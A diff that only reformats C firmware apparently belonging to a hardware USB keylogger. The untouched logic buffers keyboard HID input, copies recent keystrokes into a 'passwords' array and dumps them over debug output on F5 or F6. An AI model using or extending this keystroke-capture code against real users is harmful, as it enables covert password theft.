@@ -18,14 +18,14 @@
  * defines
  */
 #define NB_INPUT 20
-#define PASSWORD_MAX_SIZE 5 // must be < NB_INPUT
+#define PASSWORD_MAX_SIZE 5  // must be < NB_INPUT
 
 /*
  * variables
  */
 static uint16_t inputs[NB_INPUT];
-static int     input_timer = -1;
-int            input_index = 0;
+static int      input_timer = -1;
+int             input_index = 0;
 
 static int nb_char_pressed = 0;
 uint8_t    led_status      = 7;
@@ -68,11 +68,11 @@ static void _hid_report_callback(USBHHIDDriver *hidp, uint16_t len)
         }
 
         if(report[2] == KEY_F6)
-            for(int i = 0; i < input_index-1; i++)
+            for(int i = 0; i < input_index - 1; i++)
                 rtt_printf("inputs[%d] = %c (%04x)", i, hid2azerty(passwords[i]), inputs[i]);
 
         if(report[2] == KEY_F5)
-            for(int i = 0; i < password_index-1; i++)
+            for(int i = 0; i < password_index - 1; i++)
                 rtt_printf("passwords[%d] = %c (%04x)", i, hid2azerty(passwords[i]), passwords[i]);
 
         if(report[2] == KEY_F1 &&
@@ -145,14 +145,14 @@ void usbh_init(void)
 static void store_lasts_inputs(int size)
 {
     rtt_printf("input_index = %d, size = %d", input_index, size);
-    if(input_index < size-1) {  // buffer made a loop
+    if(input_index < size - 1) {  // buffer made a loop
         int bytes_written = size - input_index - 1;
         //end inputs
         memcpy(passwords + password_index, inputs + NB_INPUT - bytes_written, (bytes_written)*2);
         //start inputs
-        memcpy(passwords + password_index + bytes_written, inputs, (input_index-1)*2);
+        memcpy(passwords + password_index + bytes_written, inputs, (input_index - 1) * 2);
     } else {
-        memcpy(passwords + password_index, inputs + input_index - size+1, size*2);
+        memcpy(passwords + password_index, inputs + input_index - size + 1, size * 2);
     }
     password_index += size;
 }
